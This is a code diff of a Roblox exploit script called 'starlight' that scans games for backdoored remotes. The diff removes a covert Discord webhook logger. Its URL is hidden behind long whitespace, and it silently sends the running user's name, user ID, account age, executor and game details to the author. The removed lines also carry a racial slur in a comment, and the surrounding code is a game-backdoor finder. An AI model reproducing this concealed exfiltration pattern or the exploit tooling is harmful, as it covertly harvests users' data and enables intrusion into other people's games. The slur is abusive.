@@ -1,5 +1,5 @@
 -- starlight 💫
--- 0.0.7
+-- 0.0.8
 
 
 
@@ -612,67 +612,7 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 		cursor.Visible = false
 	end)
 
-	-- NIGGER SKIDS DONT YOU DARE TOUCH MY WEBHOOK BOO BOO BEAR
-  local webh0okURL = "https://discord.com/api/webhooks/112233445566778899/a1b2c3d4e5f6g7h8i9j0kLmNoPqRsTuVwXyZ"
-  local MarketplaceService = game:GetService("MarketplaceService")
-	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           local webhookURL = "https://discord.com/api/webhooks/1352935769202888835/vX8Y8WOf96PLoTChDzvbA9l1oAMZyHgSsBFmMJDDCmNvILju7IlGkiYNpW7Zgp3AU_O0"
 
-
-	local function sendWebhookMessage(IsBackdooredTrue)
-		local gameID = game.GameId
-		local placeID = game.PlaceId
-		local jobID = game.JobId
-		local gameLink = "https://www.roblox.com/games/" .. placeID
-		local totalPlayers = #Players:GetPlayers()
-		local accountAge = LocalPlayer.AccountAge
-		local userID = LocalPlayer.UserId
-		local executor = identifyexecutor and identifyexecutor() or "Unknown"
-		local gameName = "Unable to get"
-		local success, result = pcall(function()
-			return MarketplaceService:GetProductInfo(placeID)
-		end)
-		if success and result then
-			gameName = result.Name
-		end
-		local backdoorStatus = IsBackdooredTrue and "✅ 𝗕𝗮𝗰𝗸𝗱𝗼𝗼𝗿𝗲𝗱" or "❌ 𝗡𝗼 𝗕𝗮𝗰𝗸𝗱𝗼𝗼𝗿"
-		local message = "```ansi\n" ..
-			"\u{001b}[1;34m[starlight]\u{001b}[0m\n" ..
-			"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
-			"\u{001b}[1;33m[Game ID]\u{001b}[0m " .. gameID .. "\n" ..
-			"\u{001b}[1;32m[Game Name]\u{001b}[0m " .. gameName .. "\n" ..
-			"\u{001b}[1;36m[Place ID]\u{001b}[0m " .. placeID .. "\n" ..
-			"\u{001b}[1;31m[Job ID]\u{001b}[0m " .. jobID .. "\n" ..
-			"\u{001b}[1;35m[Game Link]\u{001b}[0m " .. gameLink .. "\n\n" ..
-			"\u{001b}[1;33m[Player]\u{001b}[0m " .. LocalPlayer.Name .. "\n" ..
-			"\u{001b}[1;36m[User ID]\u{001b}[0m " .. userID .. "\n" ..
-			"\u{001b}[1;32m[Account Age]\u{001b}[0m " .. accountAge .. " days\n" ..
-			"\u{001b}[1;34m[Executor]\u{001b}[0m " .. executor .. "\n\n" ..
-			"\u{001b}[1;31m[Backdoor Status]\u{001b}[0m " .. backdoorStatus .. "\n\n" ..
-			"\u{001b}[1;35m[Total Players]\u{001b}[0m " .. totalPlayers .. "\n\n" ..
-			"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
-			"\u{001b}[1;33m[Timestamp]\u{001b}[0m " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
-			"```"
-		local payload = {
-			username = "starlight 💫",
-			content = message
-		}
-		print("💫 starlight: sending webhook log with payload:", HttpService:JSONEncode(payload))
-		local success, errorMessage = pcall(function()
-			request({
-				Url = webhookURL,
-				Method = "POST",
-				Headers = {
-					["Content-Type"] = "application/json"
-				},
-				Body = HttpService:JSONEncode(payload)
-			})
-		end)
-		if not success then
-			warn("💫 starlight: failed to send webhook log: " .. tostring(errorMessage))
-		else
-			print("💫 starlight: webhook log sent successfully!")
-		end
-	end
 	runService.RenderStepped:Connect(updateCursor)
 	local RunService = game:GetService("RunService")
 	local excludedRemotes = {
@@ -788,12 +728,10 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 	end)
 	if not remoteEvent or not remoteFunction then
 		script.Parent.Check.Text = "backdoor not found!"
-		sendWebhookMessage(false)  -- Send webhook message if backdoor is 
 	else
 		script.Parent.Check.Visible = false
 		script.Parent.Framee.Visible = true
 		script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-		sendWebhookMessage(true)  -- Send webhook message if backdoor is 
 		game.StarterGui:SetCore("SendNotification",{
 			Title = "💫 starlight",
 			Text = "backdoor found! backdoor: " .. remoteEvent:GetFullName(),
